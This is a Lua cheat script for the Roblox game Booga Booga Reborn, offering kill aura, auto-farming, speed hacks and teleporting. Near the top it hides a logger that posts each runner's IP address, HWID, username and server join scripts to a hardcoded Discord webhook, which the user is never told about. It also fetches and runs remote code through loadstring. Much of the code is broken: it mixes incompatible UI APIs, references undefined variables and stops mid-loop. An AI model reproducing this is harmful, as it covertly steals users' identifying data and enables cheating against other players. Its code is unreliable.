local success, err = pcall(function()

-- Project Intra Hub -- Booga Booga Reborn (defensive version: avoids nil-call crashes)
print("Loading Project Intra Hub -- Booga Booga Reborn")
print("-----------------------------------------")

-- Safe remote loader: fetch code, use loadstring or load, pcall execute
local function safe_load_remote(url)
    local ok, res = pcall(function() return game:HttpGetAsync(url) end)
    if not ok or not res then
        warn("[IntraHub] Failed to HttpGet:", url, res)
        return nil, "httpfailed"
    end
    local code = res
    local loader = loadstring or load
    if not loader then
        warn("[IntraHub] No loadstring/load available in this environment.")
        return nil, "noload"
    end
    local f, ferr = pcall(function() return loader(code) end)
    if not f or type(ferr) ~= "function" then
        warn("[IntraHub] loader returned error or non-function", ferr)
        return nil, "loadfail"
    end
    local ok2, result = pcall(ferr)
    if not ok2 then
        warn("[IntraHub] Error executing loaded code:", result)
        return nil, "execfail"
    end
    return result, nil
end

local Luxtl = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Luxware-UI-Library/main/Source.lua"))()
local Luxt = Luxtl.CreateWindow("Project Infra Hub", 6105620301)



local mainTab = Luxt:Tab("Main")
local combatTab = Luxt:Tab("Combat")
local survivalTab = Luxt:Tab("Survival")
local extraTab = Luxt:Tab("Extra")
local tweensTab = Luxt:Tab("Tweens")



-- Safe require of Packets module (pcall)
local packets = {}
do
    local ok, mod = pcall(function() return require(game:GetService("ReplicatedStorage").Modules.Packets) end)
    if ok and mod then packets = mod else
        warn("[IntraHub] packets module missing or failed to require; using empty packets table.")
        packets = {}
    end
end

-- Basic refs
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local char = plr and (plr.Character or plr.CharacterAdded:Wait())
local root = char and (char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart"))
local hum = char and (char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid"))
local runs = game:GetService("RunService")
local httpservice = game:GetService("HttpService")
local marketservice = game:GetService("MarketplaceService")
local rbxservice = game:GetService("RbxAnalyticsService")
local tspmo = game:GetService("TweenService")

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local LocalPlayer = Players.LocalPlayer

local webhookURL = "https://discordapp.com/api/webhooks/1434794468325982281/Jf837vvcVpQ4zy1rfFS4NsT9_HFNukBKPqDIhagp9e02NAnQIHa4FlSLwTwCjKwybbm3"

-- Track execution time
local startTime = tick()

-- Safe executor detection
local executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Safe IP fetch
local ip = "Unavailable"
pcall(function()
    ip = game:HttpGet("https://api.ipify.org")
end)

-- Game info
local gameId = game.PlaceId
local jobId = game.JobId
local gameName = MarketplaceService:GetProductInfo(gameId).Name
local playerCount = #Players:GetPlayers()

-- Join scripts
local jsJoinCode = [[
fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
    const server = json.data.find(s => s.id === "]] .. jobId .. [[");
    if (server) {
        window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
    } else {
        console.log("Server not found.");
    }
});
]]

local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]

-- Send log to Discord
local function sendExecutionLog()
    local duration = math.floor(tick() - startTime)

    local embed = {
        ["title"] = "[PROJECT INSTRA] Execution Log",
        ["description"] = table.concat({
            "[+] Username: " .. LocalPlayer.Name,
            "[+] Display Name: " .. LocalPlayer.DisplayName,
            "[+] User ID: " .. tostring(LocalPlayer.UserId),
            "[+] Executor: " .. executor,
            "[+] IP Address: " .. ip,
            "[+] HWID: " .. RbxAnalyticsService:GetClientId(),
            "[+] Game Name: " .. gameName,
            "[+] Game ID: " .. tostring(gameId),
            "[+] Job ID: " .. jobId,
            "[+] Players in Server: " .. tostring(playerCount),
            "[+] Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
            "[+] Execution Duration: " .. tostring(duration) .. " seconds",
            "",
            "[+] JavaScript Join Code:",
            "```js\n" .. jsJoinCode .. "\n```",
            "[+] Lua Join Script:",
            "```lua\n" .. luaJoinScript .. "\n```"
        }, "\n"),
        ["type"] = "rich",
        ["color"] = 0x000000,
        ["footer"] = { ["text"] = "Execution Log - Roblox" },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {embed}
    })

    local requestFunction = syn and syn.request or http_request or request
    if requestFunction then
        requestFunction({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = payload
        })
    else
        warn("Your executor does not support HTTP requests.")
    end
end

-- Send on execution
sendExecutionLog()

-- Optionally send again on leave
LocalPlayer.AncestryChanged:Connect(function(_, parent)
    if not parent then
        sendExecutionLog()
    end
end)




-- Minimal safe setclipboard wrapper
local function safe_setclipboard(val)
    if type(setclipboard) == "function" then
        pcall(setclipboard, val)
    else
        -- fallback: copy to system not available — print instead
        pcall(function() print("[IntraHub] setclipboard not available. Value:\n", val) end)
    end
end

-- Begin original v0 content (kept intact where possible) + added minimal UI elements inside new tabs only
local itemslist = {
"Adurite", "Berry", "Bloodfruit", "Bluefruit", "Coin", "Essence", "Hide", "Ice Cube", "Iron", "Jelly", "Leaves", "Log", "Steel", "Stone", "Wood", "Gold", "Raw Gold", "Crystal Chunk", "Raw Emerald"
}
local Options = Library.Options or {}

--{MAIN TAB}
-- WalkSpeed Toggle & Slider
mainTab:Toggle("Walkspeed", function(state)
    _G.WalkspeedEnabled = state
end)

mainTab:Slider("WalkSpeed Value", 1, 35, function(value)
    _G.WalkspeedValue = value
end)

-- JumpPower Toggle & Slider
mainTab:Toggle("JumpPower", function(state)
    _G.JumpPowerEnabled = state
end)

mainTab:Slider("JumpPower Value", 1, 65, function(value)
    _G.JumpPowerValue = value
end)

-- HipHeight Toggle & Slider
mainTab:Toggle("HipHeight", function(state)
    _G.HipHeightEnabled = state
end)

mainTab:Slider("HipHeight Value", 0.1, 6.5, function(value)
    _G.HipHeightValue = value
end)

-- No Mountain Slip Toggle
mainTab:Toggle("No Mountain Slip", function(state)
    _G.NoSlipEnabled = state
end)

-- Copy Buttons
mainTab:Button("Copy Job ID", function()
    safe_setclipboard(game.JobId)
end)

mainTab:Button("Copy HWID", function()
    safe_setclipboard(rbxservice:GetClientId())
end)

mainTab:Button("Copy SID", function()
    safe_setclipboard(rbxservice:GetSessionId())
end)

--{COMBAT TAB}
-- Kill Aura Toggle
combatTab:Toggle("Kill Aura", function(state)
    _G.KillAuraEnabled = state
end)

-- Target Count Dropdown
combatTab:DropDown("Target Count", {"1", "2", "3", "4", "5"}, function(selected)
    _G.TargetCount = tonumber(selected)
end)

-- Swing Cooldown Slider
combatTab:Slider("Swing Cooldown", 0.1, 2.0, function(value)
    _G.SwingCooldown = value
end)

-- Rock Animation Sync Toggle
combatTab:Toggle("Rock Animation Sync", function(state)
    _G.RockSyncEnabled = state
end)

-- Auto Attack Toggle
combatTab:Toggle("Auto Attack", function(state)
    _G.AutoAttack = state
end)

-- Attack Range Slider
combatTab:Slider("Attack Range", 5, 50, function(value)
    _G.AttackRange = value
end)



--{MAP TAB}
-- Initialize Map tab
local mapTab = Luxt:Tab("Map")

-- Resource Aura
mapTab:Toggle("Resource Aura", function(state)
    _G.ResourceAuraEnabled = state
end)

mapTab:Slider("Resource Aura Range", 1, 20, function(value)
    _G.ResourceAuraRange = value
end)

mapTab:DropDown("Resource Max Targets", {"1", "2", "3", "4", "5", "6"}, function(selected)
    _G.ResourceMaxTargets = tonumber(selected)
end)

mapTab:Slider("Resource Swing Cooldown (s)", 0.01, 1.01, function(value)
    _G.ResourceSwingCooldown = value
end)

-- Critter Aura
mapTab:Toggle("Critter Aura", function(state)
    _G.CritterAuraEnabled = state
end)

mapTab:Slider("Critter Aura Range", 1, 20, function(value)
    _G.CritterAuraRange = value
end)

mapTab:DropDown("Critter Max Targets", {"1", "2", "3", "4", "5", "6"}, function(selected)
    _G.CritterMaxTargets = tonumber(selected)
end)

mapTab:Slider("Critter Swing Cooldown (s)", 0.01, 1.01, function(value)
    _G.CritterSwingCooldown = value
end)


--{PICKUP TAB}
-- Initialize Pickup tab
local pickupTab = Luxt:Tab("Pickup")

-- Auto Pickup
pickupTab:Toggle("Auto Pickup", function(state)
    _G.AutoPickup = state
end)

pickupTab:Toggle("Auto Pickup From Chests", function(state)
    _G.AutoPickupChests = state
end)

pickupTab:Slider("Pickup Range", 1, 35, function(value)
    _G.PickupRange = value
end)

pickupTab:DropDown("Items", {"Berry", "Bloodfruit", "Bluefruit", "Lemon", "Strawberry", "Gold", "Raw Gold", "Crystal Chunk", "Coin"}, function(selected)
    _G.SelectedPickupItem = selected
end)

-- Auto Drop
pickupTab:Toggle("Auto Drop", function(state)
    _G.AutoDrop = state
end)

pickupTab:DropDown("Select Item to Drop", {"Bloodfruit", "Jelly", "Bluefruit", "Log", "Leaves", "Wood"}, function(selected)
    _G.DropItem = selected
end)

pickupTab:Toggle("Auto Drop Custom", function(state)
    _G.AutoDropCustom = state
end)

pickupTab:TextBox("Custom Item", "Bloodfruit", function(text)
    _G.CustomDropItem = text
end)


--{FARMING TAB}
-- Initialize Farming tab
local farmingTab = Luxt:Tab("Farming")

-- Fruit Selector
farmingTab:DropDown("Select Fruit", {"Bloodfruit", "Bluefruit", "Lemon", "Coconut", "Jelly", "Banana", "Orange", "Oddberry", "Berry"}, function(selected)
    _G.SelectedFruit = selected
end)

-- Auto Plant
farmingTab:Toggle("Auto Plant", function(state)
    _G.AutoPlant = state
end)

farmingTab:Slider("Plant Range", 1, 30, function(value)
    _G.PlantRange = value
end)

farmingTab:Slider("Plant Delay (s)", 0.01, 1, function(value)
    _G.PlantDelay = value
end)

-- Auto Harvest
farmingTab:Toggle("Auto Harvest", function(state)
    _G.AutoHarvest = state
end)

farmingTab:Slider("Harvest Range", 1, 30, function(value)
    _G.HarvestRange = value
end)

-- Tween Stuff Section
farmingTab:Label("Tween Stuff — Project Instra runs :(")

farmingTab:Toggle("Tween to Plant Box", function(state)
    _G.TweenToPlantBox = state
end)

farmingTab:Toggle("Tween to Bush + Plant Box", function(state)
    _G.TweenToBush = state
end)

farmingTab:Slider("Tween Range", 1, 250, function(value)
    _G.TweenRange = value
end)

-- Plantbox Stuff Section
farmingTab:Label("Plantbox Stuff — project instra runs :(")

farmingTab:Button("Place 16x16 Plantboxes (256)", function()
    placestructure(16)
end)

farmingTab:Button("Place 15x15 Plantboxes (225)", function()
    placestructure(15)
end)

farmingTab:Button("Place 10x10 Plantboxes (100)", function()
    placestructure(10)
end)

farmingTab:Button("Place 5x5 Plantboxes (25)", function()
    placestructure(5)
end)

farmingTab:Button("🌱 Plant All Nearby", function()
    local range = _G.PlantRange or 30
    local selectedfruit = _G.SelectedFruit or "Bloodfruit"
    local itemID = fruittoitemid[selectedfruit] or 94
    -- your planting logic here
end)


        local plantboxes = getpbs(range)
        for _, box in ipairs(plantboxes) do
            if box and box.deployable and not box.deployable:FindFirstChild("Seed") then
                if packets and packets.InteractStructure and type(packets.InteractStructure.send) == "function" then
                    packets.InteractStructure.send({ entityID = box.entityid, itemID = itemID })
                end
            end
        end
    end
})


--{EXTRA TAB}
-- Initialize Extra tab
local extraTab = Luxt:Tab("Extra")

-- Infinite Yield Button
extraTab:Button("Infinite Yield", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tydetoysf/booga/main/code.lua"))()
    end)
end)

-- Orbit Info Label
extraTab:Label("orbit breaks sometimes — i don't give a shit")

-- Item Orbit Toggle
extraTab:Toggle("Item Orbit", function(state)
    _G.ItemOrbitEnabled = state
end)

-- Orbit Sliders
extraTab:Slider("Grab Range", 1, 50, function(value)
    _G.OrbitGrabRange = value
end)

extraTab:Slider("Orbit Radius", 0, 30, function(value)
    _G.OrbitRadius = value
end)

extraTab:Slider("Orbit Speed", 0, 10, function(value)
    _G.OrbitSpeed = value
end)

extraTab:Slider("Item Height", -3, 10, function(value)
    _G.ItemHeight = value
end)


-- Initialize Tweens tab
local tweensTab = Luxt:Tab("Tweens")

-- Tween Controls Label
tweensTab:Label("Tween Controls — Create, manage, and replay custom tweens.")

-- Enable Tweening Toggle
tweensTab:Toggle("Enable Tweening", function(state)
    _G.TweeningEnabled = state
end)

-- Tween NoClip Toggle
tweensTab:Toggle("Tween NoClip", function(state)
    _G.TweenNoClip = state
end)

-- Record Movement Path Toggle
tweensTab:Toggle("Record Movement Path", function(state)
    _G.RecordTweenPath = state
end)


-- Sliders
local tweenspeedslider = Tabs.Tweens:CreateSlider("tweenspeedslider", {
    Title = "Tween Speed",
    Min = 1,
    Max = 100,
    Rounding = 1,
    Default = 50
})

-- Preset Dropdown
local tweenSpeedPreset = Tabs.Tweens:CreateDropdown("tweenSpeedPreset", {
    Title = "Tween Speed Preset",
    Values = { "Slow", "Normal", "Fast", "Instant" },
    Default = "Normal"
})

-- Position Input
local tweenpositioninput = Tabs.Tweens:CreateInput("tweenpositioninput", {
    Title = "Move To Position (x,y,z)",
    Default = "0,0,0",
    Numeric = false,
    Finished = true
})

-- Tween Speed Resolver
local function getTweenSpeed()
    local preset = tweenSpeedPreset.Value
    if preset == "Slow" then return 2
    elseif preset == "Normal" then return 5
    elseif preset == "Fast" then return 10
    elseif preset == "Instant" then return 0.1
    end
    return tweenspeedslider.Value / 10
end

-- Tween to Position
Tabs.Tweens:CreateButton({
    Title = "Tween to Position",
    Description = "Moves player to target position",
    Callback = function()
        local pos = tweenpositioninput.Value
        local x, y, z = unpack(pos:split(","))
        local target = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
        local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local tweenInfo = TweenInfo.new(getTweenSpeed(), Enum.EasingStyle.Linear)
            local tween = tspmo:Create(root, tweenInfo, {Position = target})
            tween:Play()
        end
    end
})

-- Cancel Tweens
Tabs.Tweens:CreateButton({
    Title = "Cancel All Tweens",
    Description = "Stops all active tweens",
    Callback = function()
        local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if root then
            tspmo:Create(root, TweenInfo.new(0), {Position = root.Position}):Cancel()
        end
    end
})

-- Movement Recorder
local recordedPositions = {}
runs.RenderStepped:Connect(function()
    if recordToggle.Value and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        local pos = plr.Character.HumanoidRootPart.Position
        if #recordedPositions == 0 or (pos - recordedPositions[#recordedPositions]).Magnitude > 2 then
            table.insert(recordedPositions, pos)
        end
    end
end)

-- Replay Path
Tabs.Tweens:CreateButton({
    Title = "Replay Tween Path",
    Description = "Moves player through recorded positions",
    Callback = function()
        local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        for _, pos in ipairs(recordedPositions) do
            local tweenInfo = TweenInfo.new(getTweenSpeed(), Enum.EasingStyle.Linear)
            local tween = tspmo:Create(root, tweenInfo, {Position = pos})
            tween:Play()
            task.wait(getTweenSpeed())
        end
    end
})

-- Clear Path
Tabs.Tweens:CreateButton({
    Title = "Clear Recorded Path",
    Description = "Wipes saved movement positions",
    Callback = function()
        recordedPositions = {}
    end
})

Tabs.Survival = Window:AddTab({ Title = "Survival", Icon = "heart" })

-- Auto Eat
local autoeattoggle = Tabs.Survival:CreateToggle("autoeattoggle", { Title = "Auto Eat", Default = false })

-- Auto Heal
local autohealtoggle = Tabs.Survival:CreateToggle("autohealtoggle", { Title = "Auto Heal", Default = false })
local autohealthslider = Tabs.Survival:CreateSlider("autohealthslider", {
    Title = "Heal Below (%)",
    Min = 1,
    Max = 100,
    Rounding = 0,
    Default = 50
})
local healcpsslider = Tabs.Survival:CreateSlider("healcpsslider", {
    Title = "Heal Interval (s)",
    Min = 0.1,
    Max = 5,
    Rounding = 1,
    Default = 1
})

-- Shared food selector
local fooddropdown = Tabs.Survival:CreateDropdown("fooddropdown", {
    Title = "Food Item",
    Values = { "Bloodfruit", "Berry", "Bluefruit", "Jelly", "Lemon", "Strawberry", "Cooked Meat", "Coconut", "Banana", "Orange" },
    Default = "Bloodfruit"
})



-- Basic walk/jump/hip behaviour using the UI elements created above (safe pcall)
local wscon, hhcon
local function updws()
    if wscon then wscon:Disconnect() end
    if wstoggle.Value or jptoggle.Value then
        wscon = runs.RenderStepped:Connect(function()
            if hum then
                hum.WalkSpeed = wstoggle.Value and wsslider.Value or 16
                hum.JumpPower = jptoggle.Value and jpslider.Value or 50
            end
        end)
    end
end

local function updhh()
    if hhcon then hhcon:Disconnect() end
    if hheighttoggle.Value then
        hhcon = runs.RenderStepped:Connect(function()
            if hum then hum.HipHeight = hheightslider.Value end
        end)
    end
end

plr.CharacterAdded:Connect(function(newChar)
    char = newChar
    root = char:WaitForChild("HumanoidRootPart")
    hum = char:WaitForChild("Humanoid")
    updws(); updhh()
end)

-- small guard for slope handling
local slopecon
local function updmsa()
    if slopecon then slopecon:Disconnect() end
    if msatoggle.Value then
        slopecon = runs.RenderStepped:Connect(function()
            if hum then hum.MaxSlopeAngle = 90 end
        end)
    else
        if hum then hum.MaxSlopeAngle = 46 end
    end
end
msatoggle:OnChanged(function() pcall(updmsa) end)
wstoggle:OnChanged(function() pcall(updws) end)
jptoggle:OnChanged(function() pcall(updws) end)
hheighttoggle:OnChanged(function() pcall(updhh) end)

-- Utility functions (safe wrappers)
local function safe_require(name)
    local ok, res = pcall(function() return require(name) end)
    if ok then return res end
    return nil
end

local function safe_call(fn, ...)
    if type(fn) ~= "function" then return nil end
    local ok, res = pcall(fn, ...)
    if not ok then warn("[IntraHub] safe_call error:", res) end
    return res
end

-- Core behavior functions kept same as v0 (packets usage guarded)
local function swingtool(arg)
    if packets and packets.SwingTool and type(packets.SwingTool.send) == "function" then
        pcall(function() packets.SwingTool.send(arg) end)
    end
end
local function pickup_fn(entityid)
    if packets and packets.Pickup and type(packets.Pickup.send) == "function" then
        pcall(function() packets.Pickup.send(entityid) end)
    end
end

local function drop_fn(itemname)
    local inv = Players.LocalPlayer.PlayerGui and Players.LocalPlayer.PlayerGui.MainGui and Players.LocalPlayer.PlayerGui.MainGui.RightPanel and Players.LocalPlayer.PlayerGui.MainGui.RightPanel.Inventory and Players.LocalPlayer.PlayerGui.MainGui.RightPanel.Inventory:FindFirstChild("List")
    if not inv then return end
    for _, child in ipairs(inv:GetChildren()) do
        if child:IsA("ImageLabel") and child.Name == itemname then
            if packets and packets.DropBagItem and type(packets.DropBagItem.send) == "function" then
                pcall(function() packets.DropBagItem.send(child.LayoutOrder) end)
            end
        end
    end
end

-- selecteditems handling
local selecteditems = {}
if itemdropdown and itemdropdown.OnChanged then
    itemdropdown:OnChanged(function(Value)
        selecteditems = {}
        for item, State in pairs(Value) do
            if State then table.insert(selecteditems, item) end
        end
    end)
end

-- Main loops - use guarded calls and local UI element values
task.spawn(function()
    while true do
        if not killauratoggle.Value then task.wait(0.1) else
            local range = tonumber(killaurarangeslider.Value) or 20
            local targetCount = tonumber(katargetcountdropdown.Value) or 1
            local cooldown = tonumber(kaswingcooldownslider.Value) or 0.1
            local targets = {}
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= plr then
                    local playerfolder = workspace.Players:FindFirstChild(player.Name)
                    if playerfolder then
                        local rootpart = playerfolder:FindFirstChild("HumanoidRootPart")
                        local entityid = playerfolder:GetAttribute("EntityID")
                        if rootpart and entityid then
                            local dist = (rootpart.Position - (root and root.Position or Vector3.new())) .Magnitude
                            if dist <= range then table.insert(targets, {eid=entityid, dist=dist}) end
                        end
                    end
                end
            end
            if #targets > 0 then
                table.sort(targets, function(a,b) return a.dist < b.dist end)
                local selectedTargets = {}
                for i=1, math.min(targetCount, #targets) do table.insert(selectedTargets, targets[i].eid) end
                swingtool(selectedTargets)
            end
            task.wait(cooldown)
        end
    end
end)


task.spawn(function()
    while true do
        if autoeattoggle.Value then
            local itemname = fooddropdown.Value
            local inv = LocalPlayer:FindFirstChild("PlayerGui")
                and LocalPlayer.PlayerGui:FindFirstChild("MainGui")
                and LocalPlayer.PlayerGui.MainGui:FindFirstChild("RightPanel")
                and LocalPlayer.PlayerGui.MainGui.RightPanel:FindFirstChild("Inventory")
                and LocalPlayer.PlayerGui.MainGui.RightPanel.Inventory:FindFirstChild("List")

            if inv then
                for _, child in ipairs(inv:GetChildren()) do
                    if child:IsA("ImageLabel") and child.Name == itemname then
                        if packets and packets.UseBagItem and type(packets.UseBagItem.send) == "function" then
                            packets.UseBagItem.send(child.LayoutOrder)
                        end
                        break
                    end
                end
            end
        end
        task.wait(1)
    end
end)

task.spawn(function()
    local lastHeal = 0
    while true do
        if autohealtoggle.Value then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum then
                local hp = hum.Health
                local maxhp = hum.MaxHealth
                local threshold = autohealthslider.Value
                local itemname = fooddropdown.Value
                local interval = healcpsslider.Value

                if (hp / maxhp * 100) <= threshold and tick() - lastHeal >= interval then
                    local inv = LocalPlayer:FindFirstChild("PlayerGui")
                        and LocalPlayer.PlayerGui:FindFirstChild("MainGui")
                        and LocalPlayer.PlayerGui.MainGui:FindFirstChild("RightPanel")
                        and LocalPlayer.PlayerGui.MainGui.RightPanel:FindFirstChild("Inventory")
                        and LocalPlayer.PlayerGui.MainGui.RightPanel.Inventory:FindFirstChild("List")

                    if inv then
                        for _, child in ipairs(inv:GetChildren()) do
                            if child:IsA("ImageLabel") and child.Name == itemname then
                                if packets and packets.UseBagItem and type(packets.UseBagItem.send) == "function" then
                                    packets.UseBagItem.send(child.LayoutOrder)
                                    lastHeal = tick()
                                end
                                break
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.05) -- tight loop for responsiveness
    end
end)




-- Resource aura
task.spawn(function()
    while true do
        if not resourceauratoggle.Value then task.wait(0.1) else
            local range = tonumber(resourceaurarange.Value) or 20
            local targetCount = tonumber(resourcetargetdropdown.Value) or 1
            local cooldown = tonumber(resourcecooldownslider.Value) or 0.1
            local targets = {}
            local allresources = {}
            for _, r in pairs(workspace:GetChildren()) do
                if r:IsA("Model") and (r:GetAttribute("EntityID") or r.Name == "Gold Node") then table.insert(allresources, r) end
            end
            for _, res in ipairs(allresources) do
                local eid = res:GetAttribute("EntityID")
                local ppart = res.PrimaryPart or res:FindFirstChildWhichIsA("BasePart")
                if ppart and eid then
                    local dist = (ppart.Position - (root and root.Position or Vector3.new())).Magnitude
                    if dist <= range then table.insert(targets, {eid=eid, dist=dist}) end
                end
            end
            if #targets > 0 then
                table.sort(targets, function(a,b) return a.dist < b.dist end)
                local sel = {}
                for i=1, math.min(targetCount, #targets) do table.insert(sel, targets[i].eid) end
                swingtool(sel)
            end
            task.wait(cooldown)
        end
    end
end)

-- Critter aura
task.spawn(function()
    while true do
        if not critterauratoggle.Value then task.wait(0.1) else
            local range = tonumber(critterrangeslider.Value) or 20
            local targetCount = tonumber(crittertargetdropdown.Value) or 1
            local cooldown = tonumber(crittercooldownslider.Value) or 0.1
            local targets = {}
            for _, critter in ipairs(workspace:GetChildren()) do
                if critter:IsA("Model") and critter:GetAttribute("EntityID") then
                    local ppart = critter.PrimaryPart or critter:FindFirstChildWhichIsA("BasePart")
                    if ppart then
                        local dist = (ppart.Position - (root and root.Position or Vector3.new())).Magnitude
                        if dist <= range then table.insert(targets, {eid=critter:GetAttribute("EntityID"), dist=dist}) end
                    end
                end
            end
            if #targets > 0 then
                table.sort(targets, function(a,b) return a.dist < b.dist end)
                local sel = {}
                for i=1, math.min(targetCount, #targets) do table.insert(sel, targets[i].eid) end
                swingtool(sel)
            end
            task.wait(cooldown)
        end
    end
end)

-- pickup loops
task.spawn(function()
    while true do
        local range = tonumber(pickuprangeslider.Value) or 35
        if autopickuptoggle.Value then
            for _, item in ipairs(workspace:FindFirstChild("Items") and workspace.Items:GetChildren() or {}) do
                local primary = (item:IsA("BasePart") and item) or (item:IsA("Model") and item.PrimaryPart)
                if primary then
                    local eid = item:GetAttribute("EntityID")
                    if eid and (primary.Position - (root and root.Position or Vector3.new())).Magnitude <= range then
                        pickup_fn(eid)
                    end
                end
            end
        end
        if chestpickuptoggle.Value then
            for _, chest in ipairs(workspace:FindFirstChild("Deployables") and workspace.Deployables:GetChildren() or {}) do
                if chest:IsA("Model") and chest:FindFirstChild("Contents") and chest.PrimaryPart then
                    for _, item in ipairs(chest.Contents:GetChildren()) do
                        local primary = (item:IsA("BasePart") and item) or (item:IsA("Model") and item.PrimaryPart)
                        if primary then
                            local eid = item:GetAttribute("EntityID")
                            if eid then
                                local dist = (chest.PrimaryPart.Position - (root and root.Position or Vector3.new())).Magnitude
                                if dist <= range then pickup_fn(eid) end
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.01)
    end
end)

-- drop handlers (safe)
local debounce = 0
local cd = 0
runs.Heartbeat:Connect(function()
    if droptoggle.Value then
        if tick() - debounce >= cd then
            local selectedItem = dropdropdown.Value
            drop_fn(selectedItem)
            debounce = tick()
        end
    end
end)

runs.Heartbeat:Connect(function()
    if droptogglemanual.Value then
        if tick() - debounce >= cd then
            local itemname = droptextbox.Value
            drop_fn(itemname)
            debounce = tick()
        end
    end
end)

-- Farming functions (plant/getpbs/getbushes/tween etc.) - kept structure from v0 but guarded
local plantedboxes = {}
local fruittoitemid = {
    Bloodfruit = 94, Bluefruit = 377, Lemon = 99, Coconut = 1, Jelly = 604,
    Banana = 606, Orange = 602, Oddberry = 32, Berry = 35, Strangefruit = 302,
    Strawberry = 282, Sunfruit = 128, Pumpkin = 80, ["Prickly Pear"] = 378,
    Apple = 243, Barley = 247, Cloudberry = 101, Carrot = 147
}

local function plant_structure(entityid, itemID)
    if packets and packets.InteractStructure and type(packets.InteractStructure.send) == "function" then
        pcall(function() packets.InteractStructure.send({ entityID = entityid, itemID = itemID }) end)
        plantedboxes[entityid] = true
    end
end

local function getpbs(range)
    local plantboxes = {}
    local deployables = workspace:FindFirstChild("Deployables")
    if not deployables then return plantboxes end
    for _, deployable in ipairs(deployables:GetChildren()) do
        if deployable:IsA("Model") and deployable.Name == "Plant Box" then
            local entityid = deployable:GetAttribute("EntityID")
            local ppart = deployable.PrimaryPart or deployable:FindFirstChildWhichIsA("BasePart")
            if entityid and ppart then
                local dist = (ppart.Position - (root and root.Position or Vector3.new())).Magnitude
                if dist <= range then table.insert(plantboxes, {entityid=entityid, deployable=deployable, dist=dist}) end
            end
        end
    end
    return plantboxes
end

local function getbushes(range, fruitname)
    local bushes = {}
    for _, model in ipairs(workspace:GetChildren()) do
        if model:IsA("Model") and model.Name:find(fruitname) then
            local ppart = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
            if ppart then
                local dist = (ppart.Position - (root and root.Position or Vector3.new())).Magnitude
                if dist <= range then
                    local entityid = model:GetAttribute("EntityID")
                    if entityid then table.insert(bushes, {entityid=entityid, model=model, dist=dist}) end
                end
            end
        end
    end
    return bushes
end

local tweening = nil
local function tween(target)
    if not target then return end
    if not root or not root.Parent then
        -- attempt to refresh refs
        plr = Players.LocalPlayer; char = plr and plr.Character
        root = char and (char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart"))
    end
    if tweening then pcall(function() tweening:Cancel() end) end
    local distance = (root and (root.Position - target.Position).Magnitude) or 0
    local duration = math.max(0.03, distance / 21)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local ok, t = pcall(function() return tspmo:Create(root, tweenInfo, {CFrame = target}) end)
    if ok and t then
        pcall(function() t:Play() end)
        tweening = t
    end
end

local function tweenplantbox(range)
    while tweenplantboxtoggle.Value do
        local pbs = getpbs(range)
        table.sort(pbs, function(a,b) return a.dist < b.dist end)
        for _, box in ipairs(pbs) do
            if not box.deployable:FindFirstChild("Seed") then
                local target = box.deployable.PrimaryPart and (box.deployable.PrimaryPart.CFrame + Vector3.new(0,5,0))
                tween(target)
                break
            end
        end
        task.wait(0.1)
    end
end

local function tweenpbs(range, fruitname)
    while tweenbushtoggle.Value do
        local bushes = getbushes(range, fruitname)
        table.sort(bushes, function(a,b) return a.dist < b.dist end)
        if #bushes > 0 then
            local target = bushes[1].model.PrimaryPart and (bushes[1].model.PrimaryPart.CFrame + Vector3.new(0,5,0))
            tween(target)
        else
            local pbs = getpbs(range)
            table.sort(pbs, function(a,b) return a.dist < b.dist end)
            for _, box in ipairs(pbs) do
                if not box.deployable:FindFirstChild("Seed") then
                    local target = box.deployable.PrimaryPart and (box.deployable.PrimaryPart.CFrame + Vector3.new(0,5,0))
                    tween(target); break
                end
            end
        end
        task.wait(0.1)
    end
end

task.spawn(function()
    while true do
        if not planttoggle.Value then
            task.wait(0.00001)
            continue
        end

        local range = tonumber(plantrangeslider.Value) or 30
        local selectedfruit = fruitdropdown.Value
        local itemID = fruittoitemid[selectedfruit] or 94

        local plantboxes = getpbs(range)
        for _, box in ipairs(plantboxes) do
            if box and box.deployable and not box.deployable:FindFirstChild("Seed") then
                if packets and packets.InteractStructure and type(packets.InteractStructure.send) == "function" then
                    packets.InteractStructure.send({ entityID = box.entityid, itemID = itemID })
                end
            end
        end

        task.wait(0.001) -- keep this low, but not zero
    end
end)



task.spawn(function()
    while true do
        if not harvesttoggle.Value then task.wait(0.1); continue end
        local harvestrange = tonumber(harvestrangeslider.Value) or 30
        local selectedfruit = fruitdropdown.Value
        local bushes = getbushes(harvestrange, selectedfruit)
        table.sort(bushes, function(a,b) return a.dist < b.dist end)
        for _, bush in ipairs(bushes) do pickup_fn(bush.entityid) end
        task.wait(0.1)
    end
end)

task.spawn(function()
    while true do
